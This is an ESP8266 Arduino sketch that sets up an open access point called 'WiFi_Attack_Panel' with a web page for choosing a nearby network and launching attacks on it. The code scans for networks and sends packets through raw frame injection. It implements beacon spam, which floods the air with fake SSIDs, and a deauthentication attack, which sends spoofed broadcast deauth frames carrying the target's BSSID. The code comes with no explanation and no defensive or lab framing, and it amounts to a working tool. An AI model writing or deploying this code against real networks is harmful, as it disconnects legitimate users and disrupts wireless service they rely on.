#include <ESP8266WiFi.h>
#include <ESPAsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>

extern "C" {
  #include "user_interface.h"
}

const char* ap_ssid = "WiFi_Attack_Panel";
const char* ap_password = "";

AsyncWebServer server(80);
DNSServer dnsServer;

struct WiFiNetwork {
  String ssid;
  uint8_t mac[6];
  int channel;
};

WiFiNetwork networks[20];
int totalNetworks = 0;
bool beaconActive = false;
bool deauthActive = false;
String selectedSSID = "";
uint8_t selectedBSSID[6];
int selectedChannel = 1;

void setup() {
  Serial.begin(115200);

  // Enable station mode & packet injection
  wifi_set_opmode(STATION_MODE);
  wifi_promiscuous_enable(1);

  // AP + STA mode to serve webpage
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(ap_ssid, ap_password);
  dnsServer.start(53, "*", WiFi.softAPIP());

  scanNetworks();

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
    String page = "<h2>Nearby WiFi Networks</h2><form action='/attack'>";
    for (int i = 0; i < totalNetworks; i++) {
      page += "<input type='radio' name='ssid' value='" + networks[i].ssid + "'>" + networks[i].ssid + "<br>";
    }
    page += "<br><input type='submit' name='type' value='Start Beacon Attack'>";
    page += "<input type='submit' name='type' value='Start Deauth Attack'>";
    page += "</form>";

    page += "<form action='/stop' method='GET'><input type='submit' value='Stop All Attacks' style='margin-top:10px; color:red;'></form>";

    request->send(200, "text/html", page);
  });

  server.on("/attack", HTTP_GET, [](AsyncWebServerRequest *request) {
    if (request->hasParam("ssid") && request->hasParam("type")) {
      selectedSSID = request->getParam("ssid")->value();
      String attackType = request->getParam("type")->value();

      for (int i = 0; i < totalNetworks; i++) {
        if (networks[i].ssid == selectedSSID) {
          selectedChannel = networks[i].channel;
          memcpy(selectedBSSID, networks[i].mac, 6);
          break;
        }
      }

      if (attackType == "Start Beacon Attack") {
        beaconActive = true;
        deauthActive = false;
      } else if (attackType == "Start Deauth Attack") {
        deauthActive = true;
        beaconActive = false;
      }

      request->send(200, "text/html", "<h3>" + attackType + " on <b>" + selectedSSID + "</b> Started</h3><a href='/'>Back</a>");
    } else {
      request->send(200, "text/html", "SSID or Type missing!");
    }
  });

  server.on("/stop", HTTP_GET, [](AsyncWebServerRequest *request) {
    beaconActive = false;
    deauthActive = false;
    request->send(200, "text/html", "<h3>All Attacks Stopped.</h3><a href='/'>Back</a>");
  });

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();

  if (beaconActive) {
    for (int i = 0; i < 50; i++) {
      sendFakeSSID(selectedSSID + "_" + String(i), selectedChannel);
      delay(5);
    }
  }

  if (deauthActive) {
    for (int i = 0; i < 5; i++) {
      sendDeauthPacket(selectedBSSID, selectedChannel);
      delay(5);
    }
  }
}

void scanNetworks() {
  Serial.println("Scanning WiFi...");
  int n = WiFi.scanNetworks();
  totalNetworks = min(n, 20);
  for (int i = 0; i < totalNetworks; ++i) {
    networks[i].ssid = WiFi.SSID(i);
    networks[i].channel = WiFi.channel(i);
    WiFi.BSSID(i, networks[i].mac);
  }
}

void sendFakeSSID(String name, uint8_t channel) {
  uint8_t beaconPacket[128] = {
    0x80, 0x00, 0x00, 0x00,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x11, 0x22, 0x33, 0x44, 0x55,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00,
    0x64, 0x00,
    0x01, 0x04,
  };

  int len = name.length();
  beaconPacket[37] = 0x00;
  beaconPacket[38] = len;
  memcpy(&beaconPacket[39], name.c_str(), len);

  wifi_set_channel(channel);
  wifi_send_pkt_freedom(beaconPacket, 39 + len, 0);
}

void sendDeauthPacket(uint8_t *bssid, uint8_t channel) {
  uint8_t deauthPacket[26] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    0x00, 0x00,
    0x07, 0x00
  };

  wifi_set_channel(channel);
  wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
}
